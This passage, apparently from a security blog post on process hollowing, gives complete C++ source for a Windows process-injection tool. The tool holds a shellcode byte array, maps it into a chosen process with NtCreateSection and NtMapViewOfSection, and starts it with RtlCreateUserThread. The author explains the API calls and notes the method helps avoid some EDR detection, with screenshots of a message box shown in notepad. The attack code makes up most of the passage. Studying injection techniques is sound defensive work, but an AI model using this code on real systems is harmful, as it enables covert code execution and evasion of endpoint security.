&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#pragma comment(lib, &amp;#34;ntdll&amp;#34;)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buf[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x68\x6b\x74\x58\x20\x68\x74\x20\x72\x65\x68\x45\x3d\x67\x65&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x68\x54\x49\x54\x4c\x68\x72\x65\x6b\x74\x68\x67\x65\x74\x20&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x31\xc9\x88\x4c\x24\x16\x89\xe1\x31\xd2\x52\x53\x51\x52\xff&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd0\x31\xc0\x50\xff\x55\x08&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;argv[])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (argc &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        LARGE_INTEGER sectionSize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; { &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt; buf };
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        HANDLE sectionHandle &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        PVOID localSectionAddress &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL, remoteSectionAddress &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// create a read write execute memory region in the local process
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fNtCreateSection(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;sectionHandle, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                SECTION_ALL_ACCESS, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                NULL,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                (PLARGE_INTEGER)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;sectionSize, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                PAGE_EXECUTE_READWRITE, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                SEC_COMMIT, NULL) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[x]Create section failed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        SIZE_T size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt; buf;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// create a view of the memory section in the local process
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fNtMapViewOfSection(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                sectionHandle, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                GetCurrentProcess(), 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;localSectionAddress, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                NULL, NULL, NULL, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;size, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, NULL, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                PAGE_READWRITE) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[x]Create map failed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        HANDLE processHandle &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; OpenProcess(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                PROCESS_ALL_ACCESS, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                FALSE, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                DWORD(atoi(argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (processHandle &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[x] Open process failed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// create a map view of the section in the target process
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fNtMapViewOfSection(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                sectionHandle, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                processHandle, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;remoteSectionAddress, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                NULL, NULL, NULL,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;size, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, NULL, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                PAGE_EXECUTE_READ) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[x]Create map failed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;remote section created&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        memcpy(localSectionAddress, buf, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(buf));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Shellcode injected at 0x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;hex &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; remoteSectionAddress &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        CloseHandle(sectionHandle);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        HANDLE targetThreadHandle &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        fRtlCreateUserThread(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                processHandle, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                NULL, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                FALSE, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                remoteSectionAddress, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                NULL, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;targetThreadHandle, NULL
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            );
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./whatever.exe &amp;lt;pid&amp;gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;NtCreateSection&lt;/code&gt; function creates a shared section of memory that two or
more processes can read from and write into. The function expects ** address of an uninitalized section handle. This section handle is initialized
by the function and will be used when referencing to that specific section&lt;/p&gt;
&lt;p&gt;&lt;code&gt;NtMapViewOfSection&lt;/code&gt; is the function that uses initliazed section handle
return as the output parameter of &lt;strong&gt;NtCreateSection&lt;/strong&gt;. The function creates
a mapping of the section referenced with &lt;strong&gt;section handle&lt;/strong&gt; in the process
user specifies.&lt;/p&gt;
&lt;p&gt;In the above snippet, &lt;code&gt;NtCreateSection&lt;/code&gt; is used to createe a section with
permissions &lt;code&gt;PAGE_EXECUTE_READWRITE&lt;/code&gt; of size &lt;code&gt;sizeof buf&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;then two calls to &lt;code&gt;NtMapViewOfSection&lt;/code&gt; are used to map the section into
local process and the remote process. Permissions for the mapping of
local process is &lt;code&gt;PAGE_READWRITE&lt;/code&gt; while permissions for the remote
process &amp;rsquo;s mapping is &lt;code&gt;PAGE_EXECUTE_READ&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;This clearly shows the advantage of NtCreateSection + NtMapViewOfSection
over many other process injection techniques. Since memory is allocated
in the target process with permissions of &lt;code&gt;PAGE_EXECUTE_READ&lt;/code&gt;, calls to
&lt;code&gt;VirtualAlloc&lt;/code&gt; wont be required. This also helps against some EDR
solutions&lt;/p&gt;
&lt;p&gt;shellcode started crashing).&lt;/p&gt;
&lt;p&gt;here&amp;rsquo;s the result.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/process-hollowing/1.png&#34; alt=&#34;remove this&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/process-hollowing/msgbox1.png&#34; alt=&#34;notepad messagebox&#34;&gt;&lt;/p&gt;
&lt;p&gt;mapped section in remote process&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/process-hollowing/permissions1.png&#34; alt=&#34;remove this&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now the APIs are understood, it is time to demonstrate the process
hollowing technique using above code injection technique.&lt;/p&gt;
&lt;h2 id=&#34;implementation&#34;&gt;Implementation&lt;/h2&gt;
&lt;p&gt;Before implementing it is essential to undersand what can be done and what
we are going to do with the above injection technique.&lt;/p&gt;
&lt;p&gt;Since this post is about process hollowing, anyone can guess we are going
to hollow out the target process image and inject a shellcode using the
above technique, but simply put, no.&lt;/p&gt;
